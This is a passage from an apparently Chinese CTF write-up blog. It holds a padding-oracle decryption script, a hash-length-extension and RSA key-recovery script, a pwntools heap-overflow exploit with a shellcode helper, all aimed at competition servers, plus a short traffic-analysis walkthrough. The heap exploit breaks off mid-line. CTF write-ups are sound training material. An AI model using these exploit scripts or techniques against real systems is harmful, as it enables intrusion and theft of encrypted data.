conn.recv()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">int2hex</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;整数转成十六进制，返回字符串形式，xx，这种方法要记下来放到日志&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> hex(i)[<span class="number">2</span>:] <span class="keyword">if</span> len(hex(i)[<span class="number">2</span>:]) == <span class="number">2</span> <span class="keyword">else</span> <span class="string">&#x27;0&#x27;</span> + hex(i)[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exor_pad</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;输入一个1~16整数，返回一个长度16Byte，前导0，后面用i进行padding的字符串&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">assert</span>(i &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">assert</span>(i &lt;= <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span>  <span class="string">&#x27;00&#x27;</span> * (<span class="number">16</span> - i) + int2hex(i) * i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exor_g</span>(<span class="params">g, pos</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;输入guess值，还有需要异或的位置(0~15)，返回一个长度16的前导0、后缀0、中间某一Byte为guess值的字符串&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">assert</span>(pos &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">assert</span>(pos &lt; <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;00&#x27;</span> * (<span class="number">15</span> - pos) + int2hex(g) + <span class="string">&#x27;00&#x27;</span> * pos</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">refill_zero</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;填充前导0，返回长度32的字符串&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0&#x27;</span> * (<span class="number">32</span> - len(s)) + s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strxor</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;xor two strings of different lengths&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> len(a) &gt; len(b):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([chr(ord(x) ^ ord(y)) <span class="keyword">for</span> (x, y) <span class="keyword">in</span> zip(a[:len(b)], b)])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([chr(ord(x) ^ ord(y)) <span class="keyword">for</span> (x, y) <span class="keyword">in</span> zip(a, b[:len(a)])])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexexor</span>(<span class="params">s1, s2</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;输入的是两个字符串，输出他们异或后的字符串&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 先decode，将字符串转成Byte数据类型，再异或，异或结果后重新编码为字符串</span></span><br><span class="line">    <span class="keyword">return</span> strxor(s1.decode(<span class="string">&quot;hex&quot;</span>), s2.decode(<span class="string">&quot;hex&quot;</span>)).encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConSec</span>():</span></span><br><span class="line">    conn = remote(<span class="string">&#x27;106.75.98.74&#x27;</span>,<span class="number">10010</span>)</span><br><span class="line">    cipher = <span class="string">&quot;c/iANCpTPQabPSwz6ixFKqrBzfbMuB5R8IGpDqQR/p7b1r9t57q1Atq9ucUbf7SQ&quot;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line">    <span class="keyword">print</span> conn.recv()</span><br><span class="line">    <span class="keyword">print</span> conn.recv()</span><br><span class="line">    <span class="keyword">return</span> conn</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_a_byte</span>(<span class="params">conn, found_msg, pos, dictinary_, iv, ct, is_padding = False</span>):</span></span><br><span class="line">    <span class="comment"># 功能：穷举一个字节，破解得到明文</span></span><br><span class="line">    <span class="comment"># 输入found_msg为之前已经找到的字符串</span></span><br><span class="line">    <span class="comment"># pos为需要穷举的字节位置：从后开始计数1~16</span></span><br><span class="line">    <span class="comment"># dicitionay为穷举字典：int型范围0~255</span></span><br><span class="line">    <span class="comment"># iv为需要进行异或的字符串，ct为待解密的密文</span></span><br><span class="line">    <span class="comment"># is_padding是检查密文的Padding有效性时候用到，默认false</span></span><br><span class="line">    pad = exor_pad(pos)</span><br><span class="line">    lastmsg = refill_zero(found_msg.encode(<span class="string">&quot;hex&quot;</span>))</span><br><span class="line">    getletter = <span class="literal">False</span></span><br><span class="line">    possible_padding = []</span><br><span class="line">    <span class="comment"># 字典破解，我有两个字典：ascii字符和padding集合</span></span><br><span class="line">    <span class="keyword">for</span> guess <span class="keyword">in</span> dictinary_:</span><br><span class="line">        gpad = exor_g(guess, pos - <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># 是把猜想值和lastmsg做异或运算，能否破解成功依赖Lastmsg的正确性。</span></span><br><span class="line">        <span class="keyword">if</span> query(hexexor(lastmsg, hexexor(iv, hexexor(gpad, pad))) + ct, conn):</span><br><span class="line">            getletter = <span class="literal">True</span></span><br><span class="line">            new_msg = int2hex(guess).decode(<span class="string">&quot;hex&quot;</span>) + found_msg</span><br><span class="line">            <span class="keyword">if</span> is_padding:</span><br><span class="line">                possible_padding.append(guess)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> new_msg</span><br><span class="line">    <span class="keyword">if</span> is_padding:</span><br><span class="line">        <span class="keyword">return</span> possible_padding</span><br><span class="line">    <span class="keyword">if</span> getletter == <span class="literal">False</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    conn = getConSec()</span><br><span class="line">    blocks = ()   <span class="comment"># 含四个元素，每个元素是长度32的字符串，使用tuple的目的是“不可变”的特性</span></span><br><span class="line">    <span class="keyword">while</span> ct:</span><br><span class="line">        blocks = blocks + (ct[:<span class="number">32</span>],)</span><br><span class="line">        ct = ct[<span class="number">32</span>:]</span><br><span class="line"></span><br><span class="line">    b = input(<span class="string">&quot;input block number to crack:\n#(1~3)&quot;</span>)</span><br><span class="line">    iv = blocks[b - <span class="number">1</span>]   <span class="comment"># 截取待破解的前一个block作为IV，其他block都可以丢弃了</span></span><br><span class="line">    block = blocks[b]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 测试最后字节的Padding是否有效</span></span><br><span class="line">    is_last_block = <span class="literal">False</span></span><br><span class="line">    <span class="comment"># if b == 3:</span></span><br><span class="line">    <span class="comment">#     is_last_block = True</span></span><br><span class="line">    <span class="keyword">if</span> is_last_block:</span><br><span class="line">        possible_paddings = test_a_byte(conn, <span class="string">&#x27;&#x27;</span>, <span class="number">1</span>, padding_chars, iv, block, <span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># 测试经过第一轮筛选处理的padding是否有效</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> possible_paddings:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;possible padding size is:&quot;</span>, i</span><br><span class="line">            msg = chr(i) * i</span><br><span class="line">            start_byte = i + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> test_a_byte(conn, msg, start_byte, printable_chars, iv, block) != <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">&quot;good padding size is:&quot;</span>, i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        start_byte = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对选定的block进行16字节的逐个字节破解</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> range(start_byte, <span class="number">17</span>):</span><br><span class="line">        is_found = test_a_byte(conn, msg, pos, printable_chars, iv, block)</span><br><span class="line">        <span class="keyword">if</span> is_found:</span><br><span class="line">            msg = is_found</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;%r&quot;</span> % msg</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;can&#x27;t found the last #%d byte&quot;</span> % pos</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> is_last_block <span class="keyword">and</span> msg:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;After cutting padding off, the last block is:\n%r&quot;</span> % msg[:-(start_byte - <span class="number">1</span>)]</span><br></pre></td></tr></table></figure><h1 id="clemency"><a href="#clemency" class="headerlink" title="clemency"></a>clemency</h1><p>hitcon国内参赛选手提过的一个架构<br>9bit代替了8bit<br>在github找了个<a href="https://github.com/cseagle/ida_clemency">ida插件</a><br><a href="http://oayoilchh.bkt.clouddn.com/17-11-5/64717057.jpg" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/17-11-5/64717057.jpg"></a></p><h1 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h1><p>搜索flag关键字，发现在一个ftp包中含有flag.zip等字样<br><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/75747794.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/75747794.jpg"></a><br>过滤得到ftp完整通信流程将传输的zip文件导出，有密码的压缩包，里面是flag.txt<br><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/13131227.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/13131227.jpg"></a><br>通过ftp||ftp-data过滤将key.log导出<br><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/2601669.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/2601669.jpg"></a><br>导入key.log为ssl证书<br><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/26430276.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/26430276.jpg"></a><br>导入http对象<br><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/17178874.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/17178874.jpg"></a><br>打开后为压缩包含mp3，进行分析<br><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/11020176.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/11020176.jpg"></a><br>拿到压缩包到密码</p><h1 id="rrrsa"><a href="#rrrsa" class="headerlink" title="rrrsa"></a>rrrsa</h1><p>hash扩展攻击 ，让用户名里出现root，然后就可以再生成一对ed，同时能看到老的ed，如果两次e相同，那就相当于拿到d了，然后请求一次密文就ok</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConSec</span>():</span></span><br><span class="line">    conn = remote(<span class="string">&#x27;106.75.98.74&#x27;</span>,<span class="number">10030</span>)</span><br><span class="line">    token = conn.recv()[<span class="number">-33</span>:<span class="number">-1</span>]</span><br><span class="line">    </span><br><span class="line">    conn.recv()</span><br><span class="line">    <span class="keyword">return</span> conn,token</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findSameE</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        conn, token = getConSec()</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;start&#x27;</span></span><br><span class="line">        h = hashpumpy.hashpump(token, <span class="string">&#x27;guest&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="number">8</span>)</span><br><span class="line">        conn.send(<span class="string">&#x27;1\n&#x27;</span>)</span><br><span class="line">        conn.recv()</span><br><span class="line">        conn.send(h[<span class="number">1</span>] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        conn.recv()</span><br><span class="line">        conn.send(h[<span class="number">0</span>] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        e = conn.recvline()</span><br><span class="line">        e = int(e[<span class="number">4</span>:])</span><br><span class="line">        d = conn.recvline()</span><br><span class="line">        d = int(d[<span class="number">4</span>:])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;e&#x27;</span>,e</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;d&#x27;</span>,d</span><br><span class="line">        conn.recv()</span><br><span class="line">        conn.recv()</span><br><span class="line">        </span><br><span class="line">        conn.send(<span class="string">&#x27;2\n&#x27;</span>)</span><br><span class="line">        n = conn.recvline()</span><br><span class="line">        n = int(n[<span class="number">4</span>:])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;n&#x27;</span>, n</span><br><span class="line">        e2 = conn.recvline()</span><br><span class="line">        e2 = int(e2[<span class="number">4</span>:])</span><br><span class="line">        conn.recv()</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;finish&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> e2 == e:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&#x27;----------------```````````````````---------------------&#x27;</span></span><br><span class="line">            conn.send(<span class="string">&#x27;3\n&#x27;</span>)</span><br><span class="line">            f = conn.recv()</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&#x27;f&#x27;</span> , f</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="keyword">return</span> f, e, d, n</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&#x27;not equal&#x27;</span></span><br><span class="line">            <span class="keyword">print</span> e2</span><br><span class="line">            <span class="keyword">print</span> e</span><br><span class="line">            conn.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    flag_enc, e, d, n = findSameE()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&#x27;flag_enc :&gt;&gt;&#x27;</span>, flag_enc</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&#x27;e and d and n&#x27;</span>, e, d, n</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拿到数据后进行解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">f = <span class="number">14683015815664558563801576941259873798326690167651050048605500438701684408496420446210954963532410318389297642966435854745489938317707457853711466218044289065290845837536321014853684020186460366403221101008046326997159780567723107338094785513531848765406240418605856262554526167176997869744050412437697207716369805258141774488366641109964920618527096963297754238554764407150841812474020940377383920892323044658675143281286681485516457951570278828305838636179900402944417184295742821658797425171138893795809447102808748184072282008730049190002045912253021436715877710641309577427718880947231481979509491773821558495630</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">42557</span></span><br><span class="line">d = <span class="number">1405803797689753766121124816811438406635097169509938302560321650694887683763354544832446421618462783636223460691651260024139139681435555981044230096841532923821590682557001444031830233529733318151758359126991717193768181340465430448286701933168519305144478953071981857058771098824813044597941221483519691463328674245665508867881940139408259177240035345986021535415530440683317357792630367912626512879140394887502781711233045371334777186553583913805249735850457844171355581182981430494538414242574735347168419095760484924117877688500538899280429652142746708737501656061740113932258961396160464225966939430889959741717</span></span><br><span class="line">n = <span class="number">14713918400954955982493042014029607543327552937244083704392427075411297382665292514617418191051874245746867146250517135476460739651464081624520241080001258396231046403732983387521544330625888052283418713567975039010130962446184781994032753116048370897450465028500819451758514917040720299792076872275983155338383970086972864937471593525080347940764126191055849932929374654181884571725974013062466998817258204252680163981682275618928317547959032958679930767406984643684388270842181251832310744561071776712068724629196823024610536091642933627694285340404564988534606855524020291041210781629240781218089956911861804824793</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> long_to_bytes(pow(f,d,n))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *     </span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uint32</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> c_uint32(x).value</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span>(<span class="params">str</span>):</span></span><br><span class="line">     log.info(str)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span>(<span class="params">string</span>):</span></span><br><span class="line">    <span class="keyword">return</span> log.info(string)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">js</span>(<span class="params">str</span>):</span></span><br><span class="line">     <span class="keyword">return</span> io.recvuntil(str)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jsn</span>(<span class="params">num</span>):</span></span><br><span class="line">     <span class="keyword">if</span> num:</span><br><span class="line">          <span class="keyword">return</span> io.recvn(num+<span class="number">1</span>)</span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">          <span class="keyword">return</span> io.recvn(num)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fs</span>(<span class="params">str</span>):</span></span><br><span class="line">     io.sendline(str)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fsn</span>(<span class="params">str</span>):</span></span><br><span class="line">     io.send(str)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stop</span>():</span></span><br><span class="line">     <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">      time.sleep(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span>():</span></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mark</span>(<span class="params">name,vaule</span>):</span></span><br><span class="line">    string=<span class="string">&#x27;\n=====&gt;&#x27;</span>+str(name)+<span class="string">&#x27; :&#x27;</span>+str(vaule)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="keyword">print</span> string</span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">string</span>):</span></span><br><span class="line">    raw_input(string)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shellcode</span>():</span></span><br><span class="line">    <span class="keyword">return</span> asm(shellcraft.amd64.linux.sh())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">###setting</span></span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">log=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">     io=process(<span class="string">&#x27;./heap&#x27;</span>)</span><br><span class="line">     libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">     io=remote(<span class="string">&#x27;106.75.8.58&#x27;</span>,<span class="number">23238</span>)</span><br><span class="line">     libc = ELF(<span class="string">&#x27;./libc&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> log:</span><br><span class="line">     context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">     gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#user code =============================</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">len1,len2</span>):</span></span><br><span class="line">    js(<span class="string">&#x27;option:&#x27;</span>)</span><br><span class="line">    fs(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    js(<span class="string">&#x27;please input the length of name&#x27;</span>)</span><br><span class="line">    fs(str(len1))</span><br><span class="line">    js(<span class="string">&#x27;please input name&#x27;</span>)</span><br><span class="line">    fs(<span class="string">&#x27;a&#x27;</span>*len1)</span><br><span class="line">    js(<span class="string">&#x27;please input the length of schoolname&#x27;</span>)</span><br><span class="line">    fs(str(len2))</span><br><span class="line">    js(<span class="string">&#x27;please input the school name&#x27;</span>)</span><br><span class="line">    fs(<span class="string">&#x27;b&#x27;</span>*len2)</span><br><span class="line">    js(<span class="string">&#x27;is a tutor?(yes/no)&#x27;</span>)</span><br><span class="line">    fs(<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit2</span>(<span class="params">id1,len1,name1</span>):</span></span><br><span class="line">    js(<span class="string">&#x27;option:&#x27;</span>)</span><br><span class="line">    fs(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    js(<span class="string">&#x27;input a id to edit&#x27;</span>)</span><br><span class="line">    fs(str(id1))</span><br><span class="line">    js(<span class="string">&#x27;input an option to edit a member.&#x27;</span>)</span><br><span class="line">    fs(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    js(<span class="string">&#x27;please input the length of new schoolname&#x27;</span>)</span><br><span class="line">    fs(str(len1))</span><br><span class="line">    js(<span class="string">&#x27;please input new schoolname&#x27;</span>)</span><br><span class="line">    fs(name1)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit1</span>(<span class="params">id1,len1,name1</span>):</span></span><br><span class="line">    js(<span class="string">&#x27;option:&#x27;</span>)</span><br><span class="line">    fs(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    js(<span class="string">&#x27;input a id to edit&#x27;</span>)</span><br><span class="line">    fs(str(id1))</span><br><span class="line">    js(<span class="string">&#x27;input an option to edit a member.&#x27;</span>)</span><br><span class="line">    fs(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    js(<span class="string">&#x27;please input the length of&#x27;</span>)</span><br><span class="line">    fs(str(len1))</span><br><span class="line">    js(<span class="string">&#x27;please input new&#x27;</span>)</span><br><span class="line">    fs(name1)</span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">id1</span>):</span></span><br><span class="line">    js(<span class="string">&#x27;option:&#x27;</span>)</span><br><span class="line">    fs(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    js(<span class="string">&#x27;input a id to intro&#x27;</span>)</span><br><span class="line">    fs(id1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        add(<span class="number">40</span>,<span class="number">40</span>)</span><br><span class="line">    dbg(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    add(<span class="number">40</span>,<span class="number">40</span>)</span><br><span class="line">    pl=<span class="number">72</span>*<span class="string">&#x27;c&#x27;</span>+p64(<span class="number">0x60f037</span>)+p64(<span class="number">8</span>)</span><br><span class="line">    edit2(<span class="number">99</span>,<span class="number">88</span>,pl)</span><br><span class="line">    <span class="comment">#dbg(&#x27;2&#x27;)</span></span><br><span class="line">    edit1(<span class="number">100</span>,<span class="number">20</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">9</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    dbg(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    add(<span class="number">40</span>,<span class="number">40</span>)</span><br><span class="line">    add(<span class="number">40</span>,<span class="number">40</span>)</span><br><span class="line">    pl2=<span class="number">72</span>*<span class="string">&#x27;c&#x27;</span>+p64(<span class="number">0x603030</span>)+p64(<span class="number">8</span>)+p64(<span 